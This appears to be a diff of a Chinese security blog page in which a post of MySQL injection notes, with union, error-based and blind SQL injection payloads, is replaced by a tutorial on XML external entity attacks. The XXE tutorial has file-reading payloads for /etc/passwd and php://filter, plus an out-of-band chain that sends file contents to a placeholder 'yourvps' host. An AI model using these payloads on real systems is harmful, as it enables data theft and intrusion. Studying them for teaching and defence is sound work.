@@ -15,30 +15,27 @@
 
 
 
-<meta name="description" content="MySQL注入杂记
-1.基础知识准备：sql注入的分类
-基于从服务器的响应：1.基于错误的sql注入；2.联合查询的类型；3.SQL盲注：基于布尔的盲注
-基于时间的盲注
-基于报错的盲注">
+<meta name="description" content="XML实体注入
+
+感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MySql 注入杂记">
-<meta property="og:url" content="http://yoursite.com/2017/10/06/MySQL注入杂记/index.html">
+<meta property="og:title" content="XML实体注入">
+<meta property="og:url" content="http://yoursite.com/2017/10/19/XML实体注入/index.html">
 <meta property="og:site_name" content="C1em0's Blog">
-<meta property="og:description" content="MySQL注入杂记
-1.基础知识准备：sql注入的分类
-基于从服务器的响应：1.基于错误的sql注入；2.联合查询的类型；3.SQL盲注：基于布尔的盲注
-基于时间的盲注
-基于报错的盲注">
-<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/mysql.jpg">
-<meta property="og:updated_time" content="2017-10-17T12:29:16.820Z">
+<meta property="og:description" content="XML实体注入
+
+感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。">
+<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/XML.jpg">
+<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/xxe1.jpg">
+<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/xxe2.jpg">
+<meta property="og:image" content="http://ourd90bac.bkt.clouddn.com/xxe3.jpg">
+<meta property="og:updated_time" content="2017-10-19T05:06:17.239Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MySql 注入杂记">
-<meta name="twitter:description" content="MySQL注入杂记
-1.基础知识准备：sql注入的分类
-基于从服务器的响应：1.基于错误的sql注入；2.联合查询的类型；3.SQL盲注：基于布尔的盲注
-基于时间的盲注
-基于报错的盲注">
-<meta name="twitter:image" content="http://ourd90bac.bkt.clouddn.com/mysql.jpg">
+<meta name="twitter:title" content="XML实体注入">
+<meta name="twitter:description" content="XML实体注入
+
+感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。">
+<meta name="twitter:image" content="http://ourd90bac.bkt.clouddn.com/XML.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -70,7 +67,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>MySql 注入杂记 | C1em0&#39;s Blog</title>
+<title>XML实体注入 | C1em0&#39;s Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -287,11 +284,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-MySQL注入杂记" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-XML实体注入" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/10/06/MySQL注入杂记/" class="article-date">
-      <time datetime="2017-10-06T03:44:20.000Z" itemprop="datePublished">2017-10-06</time>
+      <a href="/2017/10/19/XML实体注入/" class="article-date">
+      <time datetime="2017-10-19T05:04:36.000Z" itemprop="datePublished">2017-10-19</time>
 </a>
 
 
@@ -306,7 +303,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      MySql 注入杂记
+      XML实体注入
     </h1>
   
 
@@ -317,7 +314,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XML/">XML</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/object-Object/">[object Object]</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/注入/">注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/源码读取/">源码读取</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -327,79 +324,42 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="MySQL注入杂记"><a href="#MySQL注入杂记" class="headerlink" title="MySQL注入杂记"></a>MySQL注入杂记</h1><p><img src="http://ourd90bac.bkt.clouddn.com/mysql.jpg" alt=""></p>
-<h2 id="1-基础知识准备："><a href="#1-基础知识准备：" class="headerlink" title="1.基础知识准备："></a>1.基础知识准备：</h2><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><ul>
-<li>基于从服务器的响应：<br>1.基于错误的sql注入；<br>2.联合查询的类型；<br>3.SQL盲注：<pre><code>基于布尔的盲注
-基于时间的盲注
-基于报错的盲注
-</code></pre><a id="more"></a></li>
-<li><p>基于注入的数据类型：<br>1.基于字符串<br>2.基于数字</p>
-</li>
-<li><p>基于程度和顺序<br>1.一阶注入；<br>2.二阶注入；<br>3.</p>
-</li>
-<li>基于注入位置<br>1.基于用户输入表单域的注入；<br>2.通过cookie注入；<br>3.通过服务器变量注入。（基于头部信息注入）</li>
-</ul>
-<h3 id="MySQL系统函数"><a href="#MySQL系统函数" class="headerlink" title="MySQL系统函数"></a>MySQL系统函数</h3><p>1.version() :mysql版本信息<br>2.user():数据库用户名<br>3.database():数据库名<br>4.@@datadir():数据库路径<br>5.@@version_compile_os():操作系统版本</p>
-<p>###函数介绍<br>1.concat(str1,str2,….):没有分隔符地连接字符串<br>2.concat_ws(separator.str1,str2,…)含有分隔符地连接字符串<br>3.group_concat(str1,str2,…):连接一族所有的字符串，并用逗号分隔</p>
-<h2 id="2-GET联合查询（有回显报错）"><a href="#2-GET联合查询（有回显报错）" class="headerlink" title="2.GET联合查询（有回显报错）"></a>2.GET联合查询（有回显报错）</h2><p>1.测试<code>id</code>值后的闭合符号，以及注释符。</p>
+        <h1 id="XML实体注入"><a href="#XML实体注入" class="headerlink" title="XML实体注入"></a>XML实体注入</h1><p><img src="http://ourd90bac.bkt.clouddn.com/XML.jpg" alt=""></p>
 <blockquote>
-<p>常见注释：<br>–+<br>#<br>`</p>
+<p>感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。<br><a id="more"></a></p>
+<p>##1. 基础引入</p>
 </blockquote>
-<p>2.<code>order by</code>联合查询，找出相应的列数</p>
-<p>3.<code>union select</code>联合查询注入。如下：</p>
-<p><strong>查询所有数据库</strong>：<code>id=-1&#39; union select 1, group_concat(table_schema),3 from information_schema.schemata--+</code></p>
-<p>注：这里我们假设查询出<code>security</code>数据库</p>
-<p><strong>查询表名（table）</strong>：<code>id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
-<p><strong>查询列名（column）</strong>：<code>id=-1&#39; union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
-<p><strong>查询字段名</strong>：<code>id=-1 union select 1,username,password from users where id=2--+</code></p>
-<p>##3. GET报错注入（无回显）<br>此种注入时区别于上一种联合查询的有回显报错的，此种无回显报错注入只能用到另外的函数来进行报错回显注入。</p>
-<ul>
-<li><p><code>extractvalue</code><br>其核心的语句大家都应该能看出是<code>select</code>后查询语句。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#爆数据库</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select database())))-- </div><div class="line">#爆表</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- </div><div class="line">#爆列</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1)))-- </div><div class="line">#爆字段</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--</div></pre></td></tr></table></figure>
-</li>
-<li><p><code>updatexml</code><br>与上面的<code>extractvalue</code>相差不大</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and 1=(updatexml(0x3a,concat(1,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>))<span class="comment">--</span></div></pre></td></tr></table></figure>
-</li>
-<li><p><code>floor</code><br>同上</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">union+<span class="keyword">select</span>+<span class="number">1</span>+<span class="keyword">from</span>+(<span class="keyword">select</span>+<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span>+table_name+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>))a+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">group</span>+<span class="keyword">by</span>+a)b</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>##4. 盲注的相关知识</p>
-<ul>
-<li>基于布尔盲注—–构造逻辑结构判断</li>
-</ul>
-<p>相关字符串截取函数：<br>1.<code>left(database(),1)&gt;&#39;s&#39;</code>   ：database()显示数据库名，left(a,b)从左侧截取a的前b位<br>2.<code>ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1)1,1)--+</code>：substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。</p>
+<h3 id="1-1什么是XML？"><a href="#1-1什么是XML？" class="headerlink" title="1.1什么是XML？"></a>1.1什么是XML？</h3><p>XML是一种可扩展标记语言（英语：Extensible Markup Language，简称：XML），是一种标记语言。标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。如何定义这些标记，既可以选择国际通用的标记语言，比如HTML。被设计用来传输和存储数据。</p>
+<h3 id="1-2基础语法"><a href="#1-2基础语法" class="headerlink" title="1.2基础语法"></a>1.2基础语法</h3><p>和HTML一样作为一种标记语言，XML也具有传统标记语言的特色。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>C1em0<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>XML-inject<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>上面的代码中可以看到出，xml语言有着我们熟悉的标签。在第一行是xml的版本和编码。在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<note>是整个文档的根元素。嵌套在note标签中的<to>和<from>则是根的子元素。</from></to></note></p>
+<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
+<h3 id="1-3XML实体"><a href="#1-3XML实体" class="headerlink" title="1.3XML实体"></a>1.3XML实体</h3><p>实体作为XML中五种简单模块中的一种，    因其用于定义与引用普通文本或者特殊字符，且实体可在内部和外部声明，所以利用其引用的特点就可以构造payload进行攻击。</p>
+<h2 id="2-文档定义类型DTD"><a href="#2-文档定义类型DTD" class="headerlink" title="2.文档定义类型DTD"></a>2.文档定义类型DTD</h2><p>DTD的作用是定义XML文档的合法构建模块。利用DTD来内部或外部引入实体。</p>
+<p>它的基本格式为：<code>&lt;!DOCTYPE 根元素名 [元素的描述]&gt;</code></p>
+<h3 id="2-1内部引入"><a href="#2-1内部引入" class="headerlink" title="2.1内部引入"></a>2.1内部引入</h3><p>首先确定格式：&lt;!ENTITY 实体名称 “实体的值”&gt;</p>
+<p>现在我们将DTD与XML放在同一个文档中，即构成了实体的内部引入：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span>  </div><div class="line"><span class="meta">&lt;!DOCTYPE xxe [  </span></div><div class="line">    &lt;!ENTITY  C1em0  "This is an internally introduced entity"&gt;    </div><div class="line">]&gt;  </div><div class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </div><div class="line">    &amp;C1em0;</div><div class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>直接访问该文档，&amp;C1em0就会被解析为“This is an internally introduced entity”并输出。</p>
+<h3 id="2-2外部引入"><a href="#2-2外部引入" class="headerlink" title="2.2外部引入"></a>2.2外部引入</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></p>
+<p>其与内部引入只是多了<code>system</code>与目标的<code>uri</code>，也就是目录。讲到这里应该可以知道xml实体注入攻击的主要目的是进行对目标的目录内容读取，目录遍历。其实也可以利用外部引入进行SSRF攻击。</p>
+<p>##3. 应用</p>
+<p>###3.1 一般的XXE攻击</p>
+<p>测试代码为test.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line">	 print_r((string)$xml);</div></pre></td></tr></table></figure></p>
 <blockquote>
-<p><code>substr()</code>的小技巧：例如在<code>substr(database(),1,1)</code>中逗号被过滤了，我们可以使用<code>from 1 to 1</code>来绕过过滤。<br>那么有同样格式的<code>limit 0,1</code>有没有这样的绕过呢？当然有。格式为：<code>1 offset 0</code>这里注查询数字的顺序。</p>
+<p>这里的<code>simplexml_load_string</code>是将xml文本生成一个对象。</p>
 </blockquote>
-<p>3.<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
-BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字符串a的c位。ord()函数和ascii()函数一样将字符转为ascii码。</p>
-<ul>
-<li>基于报错的MySQL盲注</li>
-<li>基于时间的盲注<br><code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code>if(a,b,c)若a成立，就执行c，不成立就执行b</li>
-</ul>
-<h3 id="GET布尔盲注"><a href="#GET布尔盲注" class="headerlink" title="GET布尔盲注"></a>GET布尔盲注</h3><ul>
-<li><p>判断数据库<br>可以使用两种函数判断：<br>1.<code>id=1&#39; and left(database(),1)=&#39;s&#39;--+</code>：直接判断数据库的名字，缺点就是受限于left函数的用法，不能进行每一位的单个字符的判断。<br>2.<code>id=1&#39; and ascii(substr(database(),1,1))=89--+</code>：和上面的语句一样用于判断数据库名，在使用脚本时用此句就行。</p>
-</li>
-<li><p>爆数据库下的表名<br><code>id=1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=136--+</code><br><em>解释</em>：<code>limit 0,1</code>中0是表示从第一个表（若数据库有多个表）开始，接着的1表示获取第一个。</p>
-</li>
-<li><p>获取字段内的值（获取字段名就和上面获取表名的操作是一样的）<br>假设我们从上一步的操作中获取了一个名叫<code>users</code>的字段，一般想来这个字段中肯定含有我们想要得到的用户名和密码，所以这里就可以用到正则注入。</p>
-</li>
-</ul>
-<p>1.<code>id=1&#39; and 1=(select 1 frominformation schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+</code></p>
-<p><strong>注意</strong>：select后的1表示我们查询的是这个字段的第一个值，若我们想查询其他字段中的值，直接更换这里的’users’即可，所以这里的limit 0,1起不到限定作用，可有可无。</p>
-<p>2.使用<code>ord()</code>与<code>mid()</code>函数</p>
-<p>解释：这里的mid()函数与substr()函数类似，有一样的功能。函数原型为：<code>MID(ColumnName, Start [, Length])</code>对字符串从start位置开始截取相应的长度。这里我就可以在substr()被禁的情况下做替换。</p>
-<h2 id="4-POST注入"><a href="#4-POST注入" class="headerlink" title="4.POST注入"></a>4.POST注入</h2><p>常见的Post注入分为两类：</p>
-<ol>
-<li><p>同时验证用户名和密码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql = select * from users where username=$usernmae <span class="keyword">and</span> password=$password limit <span class="number">1</span>,<span class="number">1</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆失败"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-</li>
-<li><p>用户名与密码分步验证</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"select password from users where username='$username'"</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">    $row = mysql_fetch_row($result);</div><div class="line">    $query_password = $row[$password];</div><div class="line">    <span class="comment">#对输入的$password进行变形</span></div><div class="line">    $input_password = modify($passowrd);</div><div class="line">    <span class="keyword">if</span>($input_password == $query_password) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"密码错误"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"用户不存在"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>我们在大多数情况下遇到的都是第一种情况，其实第一种情况与第二种情况并无太大区别，就是在查询成功后页面返回不同而已。其余的都和普通的注入一样。这里就不再反复赘述。</p>
+<p>上面说过，xxe攻击的形式一般是读取源码，所以这里就要一些读取文件的协议，最常用的就是<code>file</code>协议。</p>
+<p>现在在windows环境下读取c盘下的target.txt文件，payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///c://target.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>将payload进行url编码，然后攻击<br><img src="http://ourd90bac.bkt.clouddn.com/xxe1.jpg" alt=""><br>读取目标文本。</p>
+<p>这是在win下，如果换在<code>linux</code>下我们可以直接用于读取用户密码<code>file:///etc/passwd</code></p>
+<p>接下来进行读取php文件，需要注意的是，因为php中含有<code>&lt;,&gt;</code>这样的括号，所以会和xml代码有冲突，所以在读取php、html文档时会导致解析错误。如果要正确读取php文档，我们可以用php中的<code>php://filter</code>协议。<br>payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=test.php"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
+<p><img src="http://ourd90bac.bkt.clouddn.com/xxe2.jpg" alt=""><br><img src="http://ourd90bac.bkt.clouddn.com/xxe3.jpg" alt=""></p>
+<h3 id="3-2-Blind-XXE"><a href="#3-2-Blind-XXE" class="headerlink" title="3.2 Blind XXE"></a>3.2 Blind XXE</h3><p>当源码为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div></pre></td></tr></table></figure></p>
+<p>也就是没有了回显，这种时候该怎么办呢？接下来就需要vps作为辅助了。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=test.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>vps上的xxe.xml：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;&gt;"&gt;</div></pre></td></tr></table></figure></p>
+<p>上述代码在DTD中定义了一个<code>file</code>实体和<code>dtd</code>实体，其中<code>file</code>实体是我们要读取的目标服务器网站的源码。<code>dtd</code>实体是引用vps上的xxe.xml文件。之后我们先引用<code>dtd</code>实体，然后在xxe.xml文件中的<code>all</code>实体，进而调用<code>send</code>实体，再调用payload中的<code>file</code>实体。最终构成了一条从vps上访问目标网站的请求,从而可以从vps上的日志直接看到目标网站上的目标文件源码。</p>
 
       
     </div>
@@ -408,13 +368,13 @@ BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字�
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/10/06/MySQL注入杂记/">MySql 注入杂记</a></p>
+        <p><span>本文标题:</span><a href="/2017/10/19/XML实体注入/">XML实体注入</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">C1em0</a></p>
-        <p><span>发布时间:</span>2017-10-06, 11:44:20</p>
-        <p><span>最后更新:</span>2017-10-17, 20:29:16</p>
+        <p><span>发布时间:</span>2017-10-19, 13:04:36</p>
+        <p><span>最后更新:</span>2017-10-19, 13:06:17</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/10/06/MySQL注入杂记/" title="MySql 注入杂记">http://yoursite.com/2017/10/06/MySQL注入杂记/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/10/06/MySQL注入杂记/　　作者: C1em0" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/10/19/XML实体注入/" title="XML实体注入">http://yoursite.com/2017/10/19/XML实体注入/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/10/19/XML实体注入/　　作者: C1em0" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -426,16 +386,10 @@ BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字�
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/10/10/PHP弱类型在CTF中的应用/">
-                    CTF中的php弱类型
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/08/16/Blackb0x-服务器渗透/">
-                    Blackb0x 服务器渗透
+                <a href="/2017/10/10/PHP弱类型在CTF中的应用/">
+                    CTF中的php弱类型
                 </a>
             </div>
         
@@ -447,7 +401,7 @@ BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字�
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL注入杂记"><span class="toc-number">1.</span> <span class="toc-text">MySQL注入杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-基础知识准备："><span class="toc-number">1.1.</span> <span class="toc-text">1.基础知识准备：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入的分类"><span class="toc-number">1.1.1.</span> <span class="toc-text">sql注入的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL系统函数"><span class="toc-number">1.1.2.</span> <span class="toc-text">MySQL系统函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-GET联合查询（有回显报错）"><span class="toc-number">1.2.</span> <span class="toc-text">2.GET联合查询（有回显报错）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET布尔盲注"><span class="toc-number">1.2.1.</span> <span class="toc-text">GET布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-POST注入"><span class="toc-number">1.3.</span> <span class="toc-text">4.POST注入</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML实体注入"><span class="toc-number">1.</span> <span class="toc-text">XML实体注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1什么是XML？"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.1什么是XML？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2基础语法"><span class="toc-number">1.0.2.</span> <span class="toc-text">1.2基础语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3XML实体"><span class="toc-number">1.0.3.</span> <span class="toc-text">1.3XML实体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-文档定义类型DTD"><span class="toc-number">1.1.</span> <span class="toc-text">2.文档定义类型DTD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1内部引入"><span class="toc-number">1.1.1.</span> <span class="toc-text">2.1内部引入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2外部引入"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.2外部引入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Blind-XXE"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.2 Blind XXE</span></a></li></ol></li></ol></li></ol>
         
     </div>
     <style>
@@ -483,7 +437,7 @@ BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字�
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"MySql 注入杂记　| C1em0's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"XML实体注入　| C1em0's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -503,15 +457,13 @@ BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字�
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/10/10/PHP弱类型在CTF中的应用/" title="上一篇: CTF中的php弱类型">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/08/16/Blackb0x-服务器渗透/" title="下一篇: Blackb0x 服务器渗透">
+            <a href="/2017/10/10/PHP弱类型在CTF中的应用/" title="下一篇: CTF中的php弱类型">
                 <i class="fa fa-angle-right"></i>
             </a>
         
